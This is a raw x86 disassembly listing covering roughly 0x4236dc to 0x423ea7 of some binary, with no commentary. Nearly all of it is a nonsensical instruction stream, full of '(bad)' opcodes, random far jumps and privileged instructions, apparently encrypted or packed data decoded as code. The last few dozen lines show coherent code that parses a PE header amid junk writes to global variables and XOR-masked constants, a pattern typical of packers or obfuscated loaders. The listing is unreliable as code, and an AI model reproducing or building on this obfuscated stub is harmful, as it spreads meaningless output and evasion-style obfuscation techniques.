  4236dc:	cmp    BYTE PTR [eax+0x48f4bbe0],al
  4236e2:	dec    ebp
  4236e3:	xor    ebp,DWORD PTR [ebp-0x3a0f2df0]
  4236e9:	sub    DWORD PTR [edi+eiz*2],esp
  4236ec:	das    
  4236ed:	push   ecx
  4236ee:	pop    ebx
  4236ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236f0:	cs leave 
  4236f2:	pop    DWORD PTR [edi+0x46]
  4236f5:	mov    ecx,0x5600161a
  4236fa:	xlat   BYTE PTR ds:[ebx]
  4236fb:	lea    esi,[ebx+0x28d2a0af]
  423701:	inc    edx
  423702:	int    0x46
  423704:	lea    esi,[ecx+0x6a9d2f6a]
  42370a:	jne    0x423749
  42370c:	cmp    bl,BYTE PTR ds:0x5abef193
  423712:	fimul  DWORD PTR [ecx+0x3250a825]
  423718:	sub    al,0x52
  42371a:	int3   
  42371b:	jmp    0x4c84b324
  423720:	cmp    bl,BYTE PTR [ecx+0x746291ac]
  423726:	sar    BYTE PTR [ebx],cl
  423728:	or     ecx,ecx
  42372a:	hlt    
  42372b:	xchg   ah,al
  42372d:	inc    esp
  42372e:	sbb    edi,DWORD PTR [ecx+eiz*1]
  423731:	fsub   st(6),st
  423733:	out    dx,al
  423734:	jecxz  0x4236bf
  423736:	ret    0xecf0
  423739:	ja     0x4236ee
  42373b:	nop
  42373c:	push   ebp
  42373d:	inc    ebx
  42373e:	pop    ebp
  42373f:	dec    ebx
  423740:	mov    ah,0xc5
  423742:	jle    0x4237ad
  423744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423746:	push   esi
  423747:	int3   
  423748:	retf   0x19f2
  42374b:	(bad)  
  42374c:	outs   dx,BYTE PTR ds:[esi]
  42374d:	inc    ebx
  42374e:	jg     0x423745
  423750:	adc    edi,DWORD PTR [edi+0x25b4c921]
  423756:	add    bh,BYTE PTR [eax]
  423758:	push   0x52
  42375a:	sub    BYTE PTR [ecx+0x46aa5331],ah
  423760:	seto   dl
  423763:	pop    edi
  423764:	dec    BYTE PTR [eax+0x133727d0]
  42376a:	cdq    
  42376b:	sbb    ecx,edx
  42376d:	cmp    bl,cl
  42376f:	sub    eax,DWORD PTR [ebx+0x4ad91171]
  423775:	in     al,dx
  423776:	sbb    al,BYTE PTR [eax-0x59]
  423779:	or     cl,dh
  42377b:	cli    
  42377c:	xchg   ebx,eax
  42377d:	lods   eax,DWORD PTR ds:[esi]
  42377e:	sbb    dh,ch
  423780:	(bad)  
  423781:	push   edi
  423782:	cmp    al,0xd7
  423784:	xor    al,0x35
  423786:	or     ah,0xf5
  423789:	push   ss
  42378a:	push   eax
  42378b:	mov    ebx,DWORD PTR [edi-0x3f39ecb5]
  423791:	sbb    BYTE PTR [edi-0x26b162b5],al
  423797:	jo     0x4237c2
  423799:	(bad)  
  42379a:	xchg   edi,eax
  42379b:	xor    esp,DWORD PTR [ebx+0x72f7cd8e]
  4237a1:	pop    ecx
  4237a2:	inc    eax
  4237a3:	inc    eax
  4237a4:	adc    dh,ah
  4237a6:	int    0x88
  4237a8:	je     0x4237dd
  4237aa:	xlat   BYTE PTR ds:[ebx]
  4237ab:	jg     0x423768
  4237ad:	xor    DWORD PTR [edx],ecx
  4237af:	(bad)  
  4237b0:	jl     0x423794
  4237b2:	mov    bl,0xca
  4237b4:	pop    edx
  4237b5:	pop    edi
  4237b6:	sbb    eax,0x28bb57ad
  4237bb:	cli    
  4237bc:	es mul ebx
  4237bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237c0:	call   0x6104:0x77eb14e5
  4237c7:	retf   
  4237c8:	rol    DWORD PTR [edi+ecx*1+0x4b],1
  4237cc:	mov    dl,0xcc
  4237ce:	inc    ebp
  4237cf:	cmp    BYTE PTR [edx],dl
  4237d1:	adc    ebp,DWORD PTR [edx-0x7fd5bc3b]
  4237d7:	mov    DWORD PTR [edx-0x1d],ebx
  4237da:	mov    dh,0x72
  4237dc:	nop
  4237dd:	jno    0x4237d6
  4237df:	into   
  4237e0:	dec    ebx
  4237e1:	data16 fmul st(0),st
  4237e4:	mov    esp,0xbbb1c0c8
  4237e9:	cmp    BYTE PTR [ebx-0x68],dl
  4237ec:	cs push esp
  4237ee:	mov    ebp,0xcb6cbd8f
  4237f3:	cli    
  4237f4:	adc    dh,cl
  4237f6:	dec    DWORD PTR [ebx-0xb40c534]
  4237fc:	gs test eax,0xe09504d3
  423802:	(bad)  
  423803:	mov    bh,0xdf
  423805:	imul   ebp,DWORD PTR [edx-0x2086fd04],0x8042c7c6
  42380f:	add    al,0xb7
  423811:	or     al,0xf5
  423813:	mov    WORD PTR [edi],cs
  423815:	pop    ds
  423816:	call   0xf2001855
  42381b:	repz rcr BYTE PTR [eax],1
  42381e:	adc    BYTE PTR [edx-0x4ab582de],0x3c
  423825:	push   esi
  423826:	out    0xbd,eax
  423828:	adc    BYTE PTR [edi-0x55742c80],ch
  42382e:	cwde   
  42382f:	(bad)  
  423830:	adc    bh,ch
  423832:	inc    ecx
  423833:	jo     0x423826
  423835:	pusha  
  423836:	dec    esp
  423837:	(bad)  
  423838:	jmp    0x42388f
  42383a:	ret    
  42383b:	and    edx,DWORD PTR es:[edi+0x5a]
  42383f:	jno    0x4238aa
  423841:	adc    ah,BYTE PTR [ebx+0x34]
  423844:	push   ecx
  423845:	icebp  
  423846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423847:	sub    al,0xd3
  423849:	jg     0x4238c5
  42384b:	fistp  DWORD PTR [ebx+eax*4+0x22ac293c]
  423852:	and    dl,ah
  423854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423855:	or     ah,BYTE PTR [ebx]
  423857:	sar    ebp,0xa3
  42385a:	jb     0x4238d3
  42385c:	test   al,0xa7
  42385e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42385f:	pop    ecx
  423860:	push   ebp
  423861:	jmp    0xc619:0x7228e698
  423868:	lea    ecx,[eax]
  42386a:	mov    BYTE PTR [edi+0x69],bl
  42386d:	mov    ecx,0x150a7a9a
  423872:	cmp    DWORD PTR es:[ebx+0x218384f],edi
  423879:	xlat   BYTE PTR ds:[ebx]
  42387a:	aaa    
  42387b:	loope  0x4237fd
  42387d:	adc    BYTE PTR [edi],0x95
  423880:	inc    ecx
  423881:	lods   eax,DWORD PTR ds:[esi]
  423882:	mov    esp,0x90df4ea7
  423887:	and    ch,BYTE PTR [esi-0x1b]
  42388a:	fsub   DWORD PTR [edi+0x1f1cfe1e]
  423890:	xor    al,0x5
  423892:	lea    ebp,fs:[eax-0x134f7660]
  423899:	lods   eax,DWORD PTR ds:[esi]
  42389a:	mov    ebx,DWORD PTR [eax]
  42389c:	sbb    bl,BYTE PTR [eax+0x512c3599]
  4238a2:	push   eax
  4238a3:	adc    eax,0xaeafdd7
  4238a8:	add    DWORD PTR [eax+0x43871255],ebx
  4238ae:	push   0xffffffd4
  4238b0:	sbb    dl,BYTE PTR [edi]
  4238b2:	or     eax,0xcc8e239a
  4238b7:	ror    ebp,0x7e
  4238ba:	test   DWORD PTR [edi+0x3b],esp
  4238bd:	gs jp  0x42392e
  4238c0:	and    ah,BYTE PTR [ecx+eiz*1+0x60]
  4238c4:	pop    eax
  4238c5:	cmp    bl,BYTE PTR [ebp-0x72]
  4238c8:	sbb    esi,DWORD PTR [ebx+edi*1-0x44d8b106]
  4238cf:	rcr    BYTE PTR [esi-0x32],cl
  4238d2:	daa    
  4238d3:	xchg   edi,eax
  4238d4:	mov    bl,0x20
  4238d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238d7:	mov    ebp,0x2536ec6e
  4238dc:	lahf   
  4238dd:	dec    ebp
  4238de:	sbb    ecx,eax
  4238e0:	in     eax,0x8f
  4238e2:	or     cl,BYTE PTR [edx+0x34118887]
  4238e8:	mov    ecx,0xe4aa9d78
  4238ed:	lods   al,BYTE PTR ds:[esi]
  4238ee:	mov    ah,0x28
  4238f0:	shl    BYTE PTR [ecx],cl
  4238f2:	or     al,0x20
  4238f4:	jmp    FWORD PTR [ebx+ebp*8]
  4238f7:	ret    0xe075
  4238fa:	imul   ebp,ebx,0xe602ae3d
  423900:	xchg   ebp,eax
  423901:	or     al,0x4e
  423903:	jbe    0x4238ff
  423905:	mov    ch,0x25
  423907:	xor    al,0xb3
  423909:	lahf   
  42390a:	or     BYTE PTR [ecx+edx*4],dl
  42390d:	vmread DWORD PTR [ebx],edi
  423910:	test   al,0xd8
  423912:	push   esi
  423913:	clc    
  423914:	loop   0x4238e1
  423916:	pop    es
  423917:	bound  eax,QWORD PTR [ebx+0x0]
  42391a:	pusha  
  42391b:	shl    ebx,1
  42391d:	fcmovnbe st,st(4)
  42391f:	adc    BYTE PTR [ebx+0x27],cl
  423922:	mov    ah,0xbb
  423924:	test   DWORD PTR [ebx-0x314c4dbf],ebx
  42392a:	mov    edx,0xac164ff1
  42392f:	mov    edi,0x2ef7556d
  423934:	into   
  423935:	sahf   
  423936:	cmp    BYTE PTR [eax+0x25],ch
  423939:	fisub  DWORD PTR [ebp-0x5be6780d]
  42393f:	add    DWORD PTR [ecx],0x206f3b6b
  423945:	xor    al,0xc0
  423947:	ds mov esp,0xdd43248f
  42394d:	fild   DWORD PTR [edx]
  42394f:	or     eax,0x3657e4fc
  423954:	sub    edx,DWORD PTR [ecx+ebp*1]
  423957:	jb     0x423901
  423959:	shl    BYTE PTR [eax+0x4d7d626d],0x32
  423960:	imul   esi,ebx,0x66
  423963:	cmp    al,al
  423965:	or     edi,DWORD PTR [eax+0x232394bc]
  42396b:	mov    WORD PTR [ebx+0x4a],ds
  42396e:	sub    DWORD PTR [ecx+0x3d],esi
  423971:	loope  0x4239f1
  423973:	inc    edx
  423974:	jg     0x4239b7
  423976:	pop    edx
  423977:	gs push ebp
  423979:	push   0xf8e26443
  42397e:	stos   BYTE PTR es:[edi],al
  42397f:	fist   DWORD PTR [ebx-0x3aef528c]
  423985:	mov    ebp,0x1f89c8d9
  42398a:	push   ecx
  42398b:	daa    
  42398c:	sbb    bh,BYTE PTR [esi+eax*4-0x4b10c5fa]
  423993:	pushf  
  423994:	or     al,0xc0
  423996:	pop    esp
  423997:	inc    ebp
  423998:	aaa    
  423999:	and    edx,DWORD PTR [esi+0x5b]
  42399c:	(bad)  
  42399e:	popf   
  42399f:	retf   0xf9c3
  4239a2:	(bad)  
  4239a3:	out    0xc1,eax
  4239a5:	jl     0x4239d0
  4239a7:	pop    es
  4239a8:	push   es
  4239a9:	pop    esi
  4239aa:	pop    ebp
  4239ab:	call   FWORD PTR [ebx]
  4239ad:	ret    0xb827
  4239b0:	jno    0x423957
  4239b2:	and    DWORD PTR [esi],esp
  4239b4:	xchg   ecx,eax
  4239b5:	test   al,0x2e
  4239b7:	adc    BYTE PTR ds:0xe584c1c1,bh
  4239bd:	mov    dh,0xbc
  4239bf:	adc    DWORD PTR [esi-0x4ede4aae],edi
  4239c5:	shl    DWORD PTR [edi-0x52],1
  4239c8:	xchg   ebp,eax
  4239c9:	mov    edx,0xb9ce9f19
  4239ce:	or     esp,DWORD PTR [edx+0x60]
  4239d1:	loopne 0x4239d7
  4239d3:	xor    al,0x99
  4239d5:	div    dl
  4239d7:	imul   edi,DWORD PTR [ebx],0x2e
  4239da:	xchg   esp,eax
  4239db:	mov    dl,bl
  4239dd:	add    BYTE PTR [esi],ch
  4239df:	pop    edi
  4239e0:	jmp    0xca3a:0x9eaf1dcd
  4239e7:	cmp    DWORD PTR [ecx],ecx
  4239e9:	mov    ebx,0xc4909d40
  4239ee:	dec    eax
  4239ef:	push   es
  4239f0:	cwde   
  4239f1:	dec    ecx
  4239f2:	aad    0xa
  4239f4:	push   ebp
  4239f5:	ja     0x423a55
  4239f7:	mov    ds,WORD PTR [ebp+0x79]
  4239fa:	lods   eax,DWORD PTR ds:[esi]
  4239fb:	pop    ebx
  4239fc:	popa   
  4239fd:	jno    0x423a6b
  4239ff:	test   al,0xe1
  423a01:	ja     0x4239e8
  423a03:	jle    0x423a1a
  423a05:	inc    edi
  423a06:	cdq    
  423a07:	(bad)  
  423a08:	adc    al,0xb4
  423a0a:	lahf   
  423a0b:	aaa    
  423a0c:	inc    ebx
  423a0d:	jmp    0x4239ec
  423a0f:	and    eax,0x5f7798d7
  423a14:	sar    BYTE PTR [edx-0x30],0xdc
  423a18:	int    0xba
  423a1a:	fcompp 
  423a1c:	push   DWORD PTR [edx]
  423a1e:	mov    ds:0xc1aadab6,al
  423a23:	mov    ah,0xbb
  423a25:	clc    
  423a26:	imul   DWORD PTR [ebp+0x6139c783]
  423a2c:	outs   dx,BYTE PTR ds:[esi]
  423a2d:	mov    DWORD PTR [ebp+0x2a4ae3c9],edx
  423a33:	into   
  423a34:	jp     0x423a9c
  423a36:	xchg   ebp,eax
  423a37:	(bad)  
  423a38:	sbb    al,0xac
  423a3a:	clc    
  423a3b:	repz cmp esi,DWORD PTR [edi-0x23f0b8a6]
  423a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a43:	stos   DWORD PTR es:[edi],eax
  423a44:	lock test al,0xf0
  423a47:	cmp    bl,BYTE PTR [ecx+ecx*2+0x35]
  423a4b:	ja     0x423a42
  423a4d:	hlt    
  423a4e:	mov    edx,0x32b4f5be
  423a53:	mov    ebx,DWORD PTR [ebp+eiz*4-0xa]
  423a57:	mov    fs,ecx
  423a59:	add    al,0x89
  423a5b:	shl    DWORD PTR ds:0x8ac18ce6,1
  423a61:	lahf   
  423a62:	and    eax,0x3a843bc6
  423a67:	ins    DWORD PTR es:[edi],dx
  423a68:	aas    
  423a69:	mov    ecx,0x3892f498
  423a6e:	cld    
  423a6f:	mov    es,WORD PTR [edi-0x61e1b8cf]
  423a75:	add    eax,0x4b416fbb
  423a7a:	adc    dl,BYTE PTR [ecx]
  423a7c:	cmp    eax,0xaf6fec15
  423a81:	and    DWORD PTR [esi],ebx
  423a83:	fsub   st(3),st
  423a85:	imul   ebx,DWORD PTR [esi],0x7b
  423a88:	add    eax,0x421c99b
  423a8d:	cld    
  423a8e:	push   0xe1c90d72
  423a93:	or     dl,ch
  423a95:	daa    
  423a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a97:	sbb    al,0x1f
  423a99:	push   0x4ae7d941
  423a9e:	int3   
  423a9f:	les    edi,FWORD PTR [edi+0x18da953d]
  423aa5:	loop   0x423a92
  423aa7:	push   eax
  423aa8:	repz xchg edx,eax
  423aaa:	jmp    0x423a30
  423aac:	xchg   edi,eax
  423aad:	test   DWORD PTR [ecx+edi*8],edi
  423ab0:	xlat   BYTE PTR ds:[ebx]
  423ab1:	push   ebp
  423ab2:	inc    eax
  423ab3:	sahf   
  423ab4:	in     eax,dx
  423ab5:	pop    esp
  423ab6:	mov    DWORD PTR [esi-0x2c32927f],ecx
  423abc:	adc    ecx,DWORD PTR [ecx-0x4d]
  423abf:	xchg   DWORD PTR [ebp+0x3a],ecx
  423ac2:	je     0x423a57
  423ac4:	push   es
  423ac5:	rep lock stos DWORD PTR es:[edi],eax
  423ac8:	xor    ah,BYTE PTR [ecx+0x19]
  423acb:	enter  0xc539,0x8c
  423acf:	lfs    eax,FWORD PTR [edi+ebp*8-0x30]
  423ad4:	in     eax,dx
  423ad5:	(bad)  
  423ad6:	loop   0x423b36
  423ad8:	jle    0x423ab0
  423ada:	mov    es,WORD PTR [edx+ecx*1-0x2b]
  423ade:	push   eax
  423adf:	xchg   edi,eax
  423ae0:	cs cli 
  423ae2:	inc    esi
  423ae3:	sub    DWORD PTR [esi+0x6fb4577c],ebp
  423ae9:	into   
  423aea:	push   edx
  423aeb:	icebp  
  423aec:	jle    0x423b0f
  423aee:	in     al,0xa4
  423af0:	aaa    
  423af1:	aam    0x74
  423af3:	fcom   QWORD PTR [ecx+0x20]
  423af6:	repnz test al,0x2a
  423af9:	fwait
  423afa:	test   eax,0xa929f6e2
  423aff:	or     ch,BYTE PTR [eax+0x38]
  423b02:	cld    
  423b03:	push   ecx
  423b04:	inc    bx
  423b06:	sahf   
  423b07:	stos   DWORD PTR es:[edi],eax
  423b08:	test   al,0xdd
  423b0a:	shl    DWORD PTR [ebp-0x25],0x15
  423b0e:	cli    
  423b0f:	cmc    
  423b10:	(bad)  
  423b11:	sub    DWORD PTR [edi+0x58b2ff],ecx
  423b17:	sub    ecx,DWORD PTR [edx-0x3b68b024]
  423b1d:	mov    bl,0xe
  423b1f:	mov    cl,BYTE PTR [ecx]
  423b21:	jge    0x423b6a
  423b23:	and    al,BYTE PTR [ebx]
  423b25:	jb     0x423aca
  423b27:	xchg   BYTE PTR [ebx+0x41744c6],bh
  423b2d:	or     BYTE PTR [ecx-0x24],0x73
  423b31:	adc    al,0x2
  423b33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b34:	ret    
  423b35:	push   esi
  423b36:	mov    ecx,0x174633b9
  423b3b:	cld    
  423b3c:	xchg   ebx,eax
  423b3d:	dec    ebx
  423b3e:	sub    BYTE PTR [eax+0x66],0xa8
  423b42:	popa   
  423b43:	test   al,0xc0
  423b45:	es xor al,0x47
  423b48:	aas    
  423b49:	hlt    
  423b4a:	or     BYTE PTR [ebp+0x1d],cl
  423b4d:	xchg   edi,eax
  423b4e:	test   DWORD PTR [ecx],ebx
  423b50:	sub    dh,BYTE PTR [ecx-0x7044bbb7]
  423b56:	push   ecx
  423b57:	fnstenv [ebp-0x7]
  423b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b5b:	(bad)  
  423b5c:	sbb    dh,BYTE PTR [edi]
  423b5e:	mov    ecx,DWORD PTR ds:0xed4ec2b8
  423b64:	cdq    
  423b65:	test   cl,bl
  423b67:	push   esp
  423b68:	fdiv   QWORD PTR [ebx]
  423b6a:	sbb    ebx,DWORD PTR [edx-0x5c]
  423b6d:	pop    es
  423b6e:	dec    esi
  423b6f:	sar    BYTE PTR [eax-0x2f],1
  423b72:	pop    edx
  423b73:	repz inc eax
  423b75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b76:	cmc    
  423b77:	enter  0xa466,0x80
  423b7b:	pop    ecx
  423b7c:	adc    al,BYTE PTR [ebx+eiz*2]
  423b7f:	pop    esi
  423b80:	add    BYTE PTR [esi+0x6386825],0x91
  423b87:	ror    BYTE PTR [ecx-0x1b],0xc8
  423b8b:	add    ah,BYTE PTR [esi]
  423b8d:	mov    ebx,0x7289d166
  423b92:	dec    edx
  423b93:	in     eax,dx
  423b94:	retf   
  423b95:	(bad)  
  423b96:	or     eax,0x788bbdcb
  423b9b:	repnz mov ebx,0x77a54d6b
  423ba1:	test   al,0xe8
  423ba3:	dec    esp
  423ba4:	test   al,0x1d
  423ba6:	add    eax,edx
  423ba8:	daa    
  423ba9:	ret    
  423baa:	xchg   ebp,eax
  423bab:	or     ah,BYTE PTR [edi+0xafbccb8]
  423bb1:	sbb    ecx,DWORD PTR ss:[ecx]
  423bb4:	jmp    0x24ec:0xcc54aac1
  423bbb:	cmp    cl,BYTE PTR [edx+0x7b]
  423bbe:	mov    dh,0x7c
  423bc0:	sub    DWORD PTR [esi+0x2c],edi
  423bc3:	push   eax
  423bc4:	sbb    al,BYTE PTR [esi]
  423bc6:	les    esp,FWORD PTR [edi-0x28905b9a]
  423bcc:	and    bl,BYTE PTR [ebx-0x71]
  423bcf:	test   dh,cl
  423bd1:	cmp    al,BYTE PTR [ebx+edx*8+0x25677e36]
  423bd8:	sbb    al,0x6c
  423bda:	(bad)  
  423bdb:	jmp    0xd3eb:0x49982518
  423be2:	in     al,dx
  423be3:	outs   dx,DWORD PTR ds:[esi]
  423be4:	jle    0x423c04
  423be6:	pop    ecx
  423be7:	ins    DWORD PTR es:[edi],dx
  423be8:	dec    edi
  423be9:	pop    edi
  423bea:	in     al,0x3f
  423bec:	mov    al,ds:0x94776cb7
  423bf1:	cdq    
  423bf2:	sbb    DWORD PTR [esi],ebx
  423bf4:	pop    ecx
  423bf5:	sub    esi,DWORD PTR [ebx+0x49]
  423bf8:	iret   
  423bf9:	inc    esp
  423bfa:	mov    ecx,0x6d136c38
  423bff:	hlt    
  423c00:	outs   dx,DWORD PTR ds:[esi]
  423c01:	inc    edi
  423c02:	lods   eax,DWORD PTR ds:[esi]
  423c03:	in     eax,dx
  423c04:	(bad)  
  423c05:	test   DWORD PTR [ebx],0x55219f36
  423c0b:	add    dh,BYTE PTR [ebx+0x5feec57a]
  423c11:	repnz rcl BYTE PTR [ebx-0x4fbb2d40],0xf1
  423c19:	shr    DWORD PTR [ebp+0x67],0xcc
  423c1d:	adc    edi,ebx
  423c1f:	or     ebp,DWORD PTR [ebp+0x4298e1c4]
  423c25:	outs   dx,BYTE PTR es:[esi]
  423c27:	rcr    ecx,1
  423c29:	mov    ds:0xc192de2,eax
  423c2e:	adc    eax,0xaa99b57
  423c33:	jle    0x423c74
  423c35:	scas   eax,DWORD PTR es:[edi]
  423c36:	dec    edx
  423c37:	inc    edi
  423c38:	int3   
  423c39:	arpl   WORD PTR [ecx+esi*1-0x4b7727a4],bx
  423c40:	je     0x423c89
  423c42:	adc    eax,0x7ece92f2
  423c47:	popf   
  423c48:	cmp    edi,DWORD PTR [edi+0x74584fba]
  423c4e:	and    BYTE PTR [esp+ecx*4-0x40],dl
  423c52:	fldenv [eax]
  423c54:	mov    ebp,0x1eb11ac2
  423c59:	pop    ss
  423c5a:	pop    es
  423c5b:	ds push ecx
  423c5d:	test   BYTE PTR ds:0x47da1c5f,0x8d
  423c64:	jge    0x423c7e
  423c66:	mov    ch,0xed
  423c68:	ja     0x423c33
  423c6a:	mov    eax,ds:0xe29ef558
  423c6f:	sub    DWORD PTR ss:[esi],esp
  423c72:	stos   DWORD PTR es:[edi],eax
  423c73:	xchg   edi,eax
  423c74:	pop    ebx
  423c75:	mov    esp,0x6c63043f
  423c7a:	adc    edi,esi
  423c7c:	pop    ebp
  423c7d:	ins    DWORD PTR es:[edi],dx
  423c7e:	cwde   
  423c7f:	arpl   cx,bx
  423c81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c82:	pop    ecx
  423c83:	push   eax
  423c84:	push   edi
  423c85:	xchg   DWORD PTR ds:0xee3dece4,ebx
  423c8b:	fdiv   st,st(2)
  423c8d:	inc    esp
  423c8e:	mov    BYTE PTR [edi],dh
  423c90:	jp     0x423c9e
  423c92:	jg     0x423d0c
  423c94:	lods   al,BYTE PTR ds:[esi]
  423c95:	sbb    cl,cl
  423c97:	pop    esp
  423c98:	sub    BYTE PTR [edx-0x8],dh
  423c9b:	pop    eax
  423c9c:	inc    edx
  423c9d:	sub    ch,BYTE PTR [eax]
  423c9f:	enter  0x87db,0x7d
  423ca3:	push   edx
  423ca4:	(bad)  
  423ca6:	fst    DWORD PTR [ebp-0x5f]
  423ca9:	ins    DWORD PTR es:[edi],dx
  423caa:	fstp   DWORD PTR [ebx]
  423cac:	mov    dl,dh
  423cae:	mov    ecx,0xdb9c192f
  423cb3:	fnstsw WORD PTR [esi+ebp*8-0x55]
  423cb7:	int    0xab
  423cb9:	lds    edi,FWORD PTR [esi+0x1c275281]
  423cbf:	mov    ebp,0xb546761a
  423cc4:	xchg   ebp,eax
  423cc5:	ins    DWORD PTR es:[edi],dx
  423cc6:	jno    0x423d29
  423cc8:	and    DWORD PTR [eax+0x51],0xf25182da
  423ccf:	jb     0x423c68
  423cd1:	jno    0x423cdc
  423cd3:	xchg   esi,eax
  423cd4:	sub    al,0x1d
  423cd6:	fsub   QWORD PTR ds:0xa715ee14
  423cdc:	sub    BYTE PTR [ebx],ch
  423cde:	int3   
  423cdf:	stos   DWORD PTR es:[edi],eax
  423ce0:	mov    edx,0x1a22999c
  423ce5:	push   edi
  423ce6:	mov    eax,DWORD PTR cs:[edi-0x382585f9]
  423ced:	jmp    0x8cce433a
  423cf2:	or     DWORD PTR [edi-0x582b1826],esi
  423cf8:	ss push 0x3b
  423cfb:	jmp    0xf6ad6ace
  423d00:	(bad)  
  423d01:	xchg   ecx,eax
  423d02:	mov    bh,0xf6
  423d04:	lock stos BYTE PTR es:[edi],al
  423d06:	not    DWORD PTR [esi+0x4]
  423d09:	xchg   ebp,eax
  423d0a:	and    al,BYTE PTR [ecx-0x66]
  423d0d:	xchg   esi,eax
  423d0e:	jl     0x423ce6
  423d10:	sbb    esp,0xfc81703e
  423d16:	pavgb  mm1,QWORD PTR [ecx]
  423d19:	fcmovnu st,st(5)
  423d1b:	add    al,0x0
  423d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d1e:	pop    esp
  423d1f:	sub    DWORD PTR [ebx+0x60c9c99a],ebp
  423d25:	mov    ds:0x63f5618a,al
  423d2a:	fs int3 
  423d2c:	sbb    esp,DWORD PTR [esi]
  423d2e:	jge    0x423cff
  423d30:	add    eax,0x2e72b98c
  423d35:	or     al,0x24
  423d37:	icebp  
  423d38:	mov    WORD PTR [edi],es
  423d3a:	pushf  
  423d3b:	inc    ebp
  423d3c:	in     eax,0xec
  423d3e:	mov    ds:0xcb5d60a2,al
  423d43:	jmp    0xca61:0x347493e
  423d4a:	mov    al,BYTE PTR [eax+0x3]
  423d4d:	sub    dl,BYTE PTR [ebp+0x11de3d]
  423d53:	call   0x2e72da38
  423d58:	icebp  
  423d59:	sbb    eax,0x6e0614e1
  423d5e:	dec    ebx
  423d5f:	and    esi,edx
  423d61:	push   edi
  423d62:	pop    ebx
  423d63:	sti    
  423d64:	and    BYTE PTR [edx-0x67cc00a4],0xa6
  423d6b:	dec    esi
  423d6c:	add    edi,DWORD PTR [ebx]
  423d6e:	out    0x27,eax
  423d70:	nop
  423d71:	popa   
  423d72:	idiv   BYTE PTR [edx+0x3]
  423d75:	jno    0x423d5d
  423d77:	mov    ds:0x47c76aa3,eax
  423d7c:	or     eax,0x3c68861f
  423d81:	repnz adc eax,0x925c9670
  423d87:	dec    edi
  423d88:	lods   al,BYTE PTR ds:[esi]
  423d89:	mov    BYTE PTR [ebp+0x1a24b3e5],bl
  423d8f:	push   edx
  423d90:	enter  0x3ef2,0x62
  423d94:	(bad)  
  423d95:	imul   edx,DWORD PTR [eax+0x1af2bf3b],0xffffffa6
  423d9c:	xor    BYTE PTR [eax],0xe9
  423d9f:	pop    ss
  423da0:	call   0xd61:0xc6ced888
  423da7:	add    dl,BYTE PTR [eax+0x172a5580]
  423dad:	sahf   
  423dae:	jo     0x423d40
  423db0:	icebp  
  423db1:	mov    ds:0x4fc86617,eax
  423db6:	lock sbb dh,BYTE PTR [esp+esi*4+0x29]
  423dbb:	ret    
  423dbc:	pop    es
  423dbd:	cmc    
  423dbe:	mov    dl,0x6c
  423dc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dc1:	fs out dx,eax
  423dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423dc4:	out    dx,al
  423dc5:	adc    DWORD PTR [edi],edi
  423dc7:	(bad)  [esi-0x2d50dd80]
  423dcd:	retf   0xf7d7
  423dd0:	bound  esp,QWORD PTR [ebp+0x3c]
  423dd3:	bound  edi,QWORD PTR [ecx]
  423dd5:	adc    al,bh
  423dd7:	jge    0x423e41
  423dd9:	(bad)  
  423dda:	popa   
  423ddb:	dec    esi
  423ddc:	mov    ebx,0xf2f7def6
  423de1:	test   al,0xa2
  423de3:	xor    eax,0x4592fe4c
  423de8:	cmp    dh,BYTE PTR [eax+0x73]
  423deb:	jle    0x423e36
  423ded:	(bad)  
  423def:	xor    bl,BYTE PTR [edi-0x4e]
  423df2:	adc    edi,0x6c
  423df5:	mov    edi,0x1674ba63
  423dfa:	dec    edx
  423dfb:	adc    bl,BYTE PTR [esi-0x6]
  423dfe:	out    0xc8,al
  423e00:	and    bh,BYTE PTR [ebx+0xf08458b]
  423e06:	mov    esi,0x72f6ba00
  423e0b:	xor    al,BYTE PTR [eax]
  423e0d:	sub    eax,edx
  423e0f:	mov    ecx,0x75108af
  423e14:	xor    eax,ecx
  423e16:	cmp    eax,0xf89c85f8
  423e1b:	mov    DWORD PTR ds:0x428e97,0x5a9f
  423e25:	jne    0x423e8a
  423e2b:	mov    eax,DWORD PTR [ebp+0x8]
  423e2e:	push   esi
  423e2f:	or     DWORD PTR ds:0x428e8b,edx
  423e35:	mov    esi,DWORD PTR [ebp+0x8]
  423e38:	add    esi,DWORD PTR [eax+0x3c]
  423e3b:	sbb    DWORD PTR ds:0x428e23,0x3013
  423e45:	mov    DWORD PTR [ebp+0x8],esi
  423e48:	sbb    DWORD PTR ds:0x428e6b,0x1c7d
  423e52:	mov    eax,DWORD PTR [ebp-0x4]
  423e55:	mov    esi,DWORD PTR ds:0x428e6b
  423e5b:	adc    esi,DWORD PTR ds:0x428e2f
  423e61:	mov    DWORD PTR ds:0x428e6b,esi
  423e67:	mov    esi,DWORD PTR [ebp+0x8]
  423e6a:	adc    DWORD PTR ds:0x428ecf,0x428ea3
  423e74:	xor    eax,ecx
  423e76:	add    eax,edx
  423e78:	cmp    DWORD PTR [esi+0x54],eax
  423e7b:	pop    esi
  423e7c:	je     0x423e8a
  423e82:	mov    eax,DWORD PTR [ebp+0x8]
  423e85:	jmp    0x423e91
  423e8a:	mov    eax,DWORD PTR [ebp-0x4]
  423e8d:	xor    eax,ecx
  423e8f:	add    eax,edx
  423e91:	leave  
  423e92:	ret    0x4
  423e95:	push   ebp
  423e96:	mov    ebp,esp
  423e98:	sub    esp,0xc
  423e9b:	push   esi
  423e9c:	or     DWORD PTR ds:0x428eaf,ebx
  423ea2:	mov    esi,0xf89c85a5
  423ea7:	and    DWORD PTR ds:0x428e97,0x0
